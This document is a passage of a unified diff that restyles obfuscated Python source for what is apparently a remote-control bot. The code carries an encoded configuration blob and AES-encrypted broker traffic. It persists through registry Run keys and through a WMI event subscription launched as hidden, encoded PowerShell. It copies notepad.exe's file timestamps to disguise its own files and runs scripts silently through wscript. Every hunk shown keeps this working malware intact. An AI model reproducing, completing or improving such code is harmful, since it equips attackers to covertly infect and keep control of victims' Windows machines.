@@ -233,7 +233,7 @@ def id_generator(size=7,chars=string_ascii_uppercase+string_digits):
 #	}
 #
 bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))
-bot_settings['bot_id']=id_generator(size=4)+'-'+bot_settings['key_id']
+bot_settings['bot_id'] = f'{id_generator(size=4)}-' + bot_settings['key_id']
 
 def get_default_settings():
 	return bot_settings
@@ -251,14 +251,16 @@ class CryptoKlass(object):
 
 	def encrypt(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi=aes_new(self.__aes_key,aes_mode_cfb,self.__aes_iv)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ)
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD
+		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.encrypt(
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ
+		)
 
 
 	def decrypt(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi=aes_new(self.__aes_key,aes_mode_cfb,self.__aes_iv)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.decrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD)
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ
+		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.decrypt(
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD
+		)
 
 
 	def encode_data(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
@@ -299,9 +301,7 @@ class CryptoKlass(object):
 		random_1_255=random_randint(1,255)
 		random_1_7=random_randint(1,7)
 		random_xored=random_1_7^random_1_255
-		random_string=''
-		for n in range(random_1_7):
-			random_string+=chr(random_randrange(255))
+		random_string = ''.join(chr(random_randrange(255)) for _ in range(random_1_7))
 		data_in_out=chr(random_1_255)+chr(random_xored)+random_string+CryptoKlass.tr_crypt(data_in_out,sha1(broker_key+random_string).hexdigest())
 		return data_in_out
 
@@ -316,11 +316,14 @@ class CryptoKlass(object):
 
 	@classmethod
 	def encrypt_file(cls,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,in_filename,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		out_filename=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('out_filename',None)
+		out_filename = pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get(
+			'out_filename'
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('chunksize',64*1024)
 		if not out_filename:
 			fd,out_filename=tempfile_mkstemp()
-		iv=''.join(chr(random_randint(0,0xFF))for i in range(16))
+		iv = ''.join(chr(random_randint(0,0xFF)) for _ in range(16))
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyi=aes_new(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,aes_mode_cbc,iv)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiQ=os_path.getsize(in_filename)
 		with open(in_filename,'rb')as infile:
@@ -339,7 +342,10 @@ class CryptoKlass(object):
 
 	@classmethod
 	def decrypt_file(cls,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,in_filename,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('out_filename',None)
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi = (
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('out_filename')
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('chunksize',64*1024)
 		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi:
 			fd,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi=tempfile_mkstemp()
@@ -365,7 +371,6 @@ class CryptoKlass(object):
 			try:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=zlib_decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
 			except Exception as e:
-				pass
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=zlib_decompressobj(-zlib_max_wbits).decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
 		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
 
@@ -384,7 +389,7 @@ class BotKlass(object):
 		self.__tick_count_state=0
 		self.__broker_key=id_generator()
 		self.__is_first_request=True
-		if not 'update_interval' in self.__settings:
+		if 'update_interval' not in self.__settings:
 			self.__settings['update_interval']=[7,18]
 		self.__current_update_interval=self.__settings['update_interval']
 		self.decode_data_pattern=re_compile('[a-zA-Z0-9-_]?')
@@ -405,7 +410,6 @@ class BotKlass(object):
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy.decrypt(settings_file.read())
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD=json_loads(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe)
 			except Exception as e:
-				pass
 				os_remove(settings_file_path)
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD=get_default_settings()
 		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD
@@ -453,17 +457,16 @@ class BotKlass(object):
 
 	@staticmethod
 	def get_key(key_type):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ=get_default_settings()['keys'][key_type]
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ
+		return get_default_settings()['keys'][key_type]
 
 
 	@property
 	def settings_file_path(self):
 		key_id=get_default_settings()['key_id']
 		if v_sys_platform.startswith('win'):
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe='tmp'+key_id.lower()
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe = f'tmp{key_id.lower()}'
 		else:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe='.'+key_id
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe = f'.{key_id}'
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=tempfile_gettempdir()
 		if v_sys_platform.startswith('win'):
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
@@ -541,7 +544,6 @@ class BotKlass(object):
 				self.__tick_count_state=2
 				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[0]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[0]and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[1]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[1]:
 					self.__current_update_interval=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy
-		pass
 		return self.__current_update_interval
 
 
@@ -556,12 +558,11 @@ class BotKlass(object):
 			self.__tick_count=min(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ,3601)
 		else:
 			self.__tick_count=1
-		pass
 
 
 	@property
 	def tick_count_enabled(self):
-		if not 'tick_count_enabled' in self.__settings:
+		if 'tick_count_enabled' not in self.__settings:
 			self.__settings['tick_count_enabled']=True
 		return self.__settings['tick_count_enabled']
 
@@ -597,20 +598,26 @@ class BotKlass(object):
 
 	@property
 	def cleanup_dirs(self):
-		if not 'cleanup_dirs' in self.__settings:
+		if 'cleanup_dirs' not in self.__settings:
 			self.__settings['cleanup_dirs']=[]
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye=self.__settings['cleanup_dirs']
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ=getattr(sys,'_MEIPASS',None)
-		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye=[]
-			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ in self.__settings['cleanup_dirs']:
-				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ!=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ:
-					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ)
+		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ := getattr(
+			sys, '_MEIPASS', None
+		):
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye = [
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ
+				for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ in self.__settings[
+					'cleanup_dirs'
+				]
+				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ
+				!= pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDeQ
+			]
+
 		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDye
 
 
 	def add_cleanup_dir(self,path):
-		if not 'cleanup_dirs' in self.__settings:
+		if 'cleanup_dirs' not in self.__settings:
 			self.__settings['cleanup_dirs']=[]
 		if path:
 			self.__settings['cleanup_dirs'].append(path)
@@ -636,20 +643,16 @@ class BotKlass(object):
 	@property
 	def self_dir(self):
 		if self.frozen:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=os_path.dirname(os_path.abspath(sys_executable))
+			return os_path.dirname(os_path.abspath(sys_executable))
 		elif __file__:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=os_path.dirname(os_path.abspath(__file__))
+			return os_path.dirname(os_path.abspath(__file__))
 		else:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye=tempfile_gettempdir()
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQye
+			return tempfile_gettempdir()
 
 
 	@property
 	def referer(self):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi=self.__settings.get('referer')
-		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi:
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi=bot_settings.get('referer')
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDQyi
+		return self.__settings.get('referer') or bot_settings.get('referer')
 
 
 	@referer.setter
@@ -737,10 +740,10 @@ class BotKlass(object):
 
 	@property
 	def user_agent(self):
-		user_agent=self.__settings.get('user_agent','')
-		if not user_agent:
-			user_agent='Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
-		return user_agent
+		return (
+			self.__settings.get('user_agent', '')
+			or 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
+		)
 
 
 	def set_user_agent(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
@@ -815,11 +818,15 @@ class RegPersistenceKlass(object):
 
 
 	def add_autostart(self,value_name,value_data):
-		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in[32]:
-			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in(HKLM,HKCU):
+		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in [32]:
+			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in (HKLM,HKCU):
 				try:
-					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.add_value(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,self.autostart_targ,value_name,value_data)
-					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
+					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie := self.add_value(
+						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,
+						self.autostart_targ,
+						value_name,
+						value_data,
+					):
 						return{'reg_type':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,'targ':self.autostart_targ,'value_name':value_name,'value_data':value_data,'bits':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe}
 				except:
 					pass
@@ -827,11 +834,14 @@ class RegPersistenceKlass(object):
 
 	def enum_autostart(self):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ=[]
-		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in[32]:
-			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in(HKLM,HKCU):
+		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe in [32]:
+			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy in (HKLM,HKCU):
 				try:
-					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.enum_key(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,self.autostart_targ,bits=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe)
-					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
+					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie := self.enum_key(
+						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,
+						self.autostart_targ,
+						bits=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyQe,
+					):
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyeQ.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
 				except:
 					pass
@@ -843,11 +853,7 @@ class pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQyDe(ctypes.Structure):
 	def __lt__(self,other):
 		if self.high>other.high:
 			return True
-		if self.high<other.high:
-			return False
-		if self.low>other.low:
-			return True
-		return False
+		return False if self.high<other.high else self.low > other.low
 
 
 class BotActionsKlass(object):
@@ -855,7 +861,10 @@ class BotActionsKlass(object):
 	def __init__(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
 		self.app_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ
 		self.exe_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi
-		self.exe_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_path',None)
+		self.exe_path = pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get(
+			'exe_path'
+		)
+
 		self.win_dir=self.get_win_folder(36)
 		self.local_appdata_dir=self.get_win_folder(0x1C)
 		self.startup_dir=self.get_win_folder(7)
@@ -871,7 +880,9 @@ class BotActionsKlass(object):
 
 	@staticmethod
 	def b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
-		return base64_b64encode("\0".join([i for i in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy])+'\0')
+		return base64_b64encode(
+			"\0".join(list(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)) + '\0'
+		)
 
 
 	def copy_and_clone_time(self,directory,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyi):
@@ -885,9 +896,14 @@ class BotActionsKlass(object):
 	def pshell_bind_trigger(self,filepath):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy="$filterName=\"{0}\";$consumerName=\"{1}\";$exePath=\"{2}\";"
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe="JFF1ZXJ5PSJTRUxFQ1QgKiBGUk9NIF9fSW5zdGFuY2VNb2RpZmljYXRpb25FdmVudCBXSVRISU4gNjAgV0hFUkUgVGFyZ2V0SW5zdGFuY2UgSVNBICdXaW4zMl9QZXJmRm9ybWF0dGVkRGF0YV9QZXJmT1NfU3lzdGVtJyBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lID49IDIwMCBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lIDwgMzIwIgp0cnl7JFdNSUV2ZW50RmlsdGVyPVNldC1XbWlJbnN0YW5jZSAtQ2xhc3MgX19FdmVudEZpbHRlciAtTmFtZVNwYWNlICJyb290XHN1YnNjcmlwdGlvbiIgLUFyZ3VtZW50cyBAe05hbWU9JGZpbHRlck5hbWU7RXZlbnROYW1lU3BhY2U9InJvb3RcY2ltdjIiO1F1ZXJ5TGFuZ3VhZ2U9IldRTCI7UXVlcnk9JFF1ZXJ5fSAtRXJyb3JBY3Rpb24gU3RvcAokV01JRXZlbnRDb25zdW1lcj1TZXQtV21pSW5zdGFuY2UgLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtTmFtZXNwYWNlICJyb290XHN1YnNjcmlwdGlvbiIgLUFyZ3VtZW50cyBAe05hbWU9JGNvbnN1bWVyTmFtZTtFeGVjdXRhYmxlUGF0aD0kZXhlUGF0aDtDb21tYW5kTGluZVRlbXBsYXRlPSRleGVQYXRofQpTZXQtV21pSW5zdGFuY2UgLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLU5hbWVzcGFjZSAicm9vdFxzdWJzY3JpcHRpb24iIC1Bcmd1bWVudHMgQHtGaWx0ZXI9JFdNSUV2ZW50RmlsdGVyO0NvbnN1bWVyPSRXTUlFdmVudENvbnN1bWVyfTtleGl0IDB9Y2F0Y2h7ZXhpdCAtMX0="
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ=self.app_name.replace(' ,.','')+botKlass.bot_id[0:2]
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ+'Filter'+str(random_randint(1,100))
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ+'Consumer'+str(random_randint(1,100))
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ = (
+			self.app_name.replace(' ,.', '') + botKlass.bot_id[:2]
+		)
+
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ = f'{pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ}Filter{str(random_randint(1,100))}'
+
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye = f'{pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeyQ}Consumer{str(random_randint(1,100))}'
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDieQ=filepath.replace("\\","\\\\")
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiyQ,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiye,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDieQ)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey+=base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe)
@@ -907,8 +923,10 @@ class BotActionsKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQy+base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiQe)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei="powershell.exe -windowstyle hidden -enc {0}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=subprocess_call(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei,creationflags=0x08000000)
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD
+		return subprocess_call(
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyei,
+			creationflags=0x08000000,
+		)
 
 
 	@staticmethod
@@ -937,15 +955,20 @@ class BotActionsKlass(object):
 	@staticmethod
 	def clone_file_times(src,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe=BotActionsKlass.get_file_times(src)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=BotActionsKlass.set_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe)
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD
+		return BotActionsKlass.set_file_times(
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy,
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe,
+		)
 
 
 	def clone_notepad_file_times(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyi=os_path.join(self.win_dir,'notepad.exe')
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=BotActionsKlass.clone_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyi,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy)
-		pass
-		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD
+		return BotActionsKlass.clone_file_times(
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyi,
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy,
+		)
 
 
 	@staticmethod
@@ -972,7 +995,12 @@ class BotActionsKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDy.name
 		with pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDy as pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziye:
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziye.write(script_str)
-		subprocess_popen('wscript.exe /B /Nologo '+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi,close_fds=True,creationflags=0x00000008)
+		subprocess_popen(
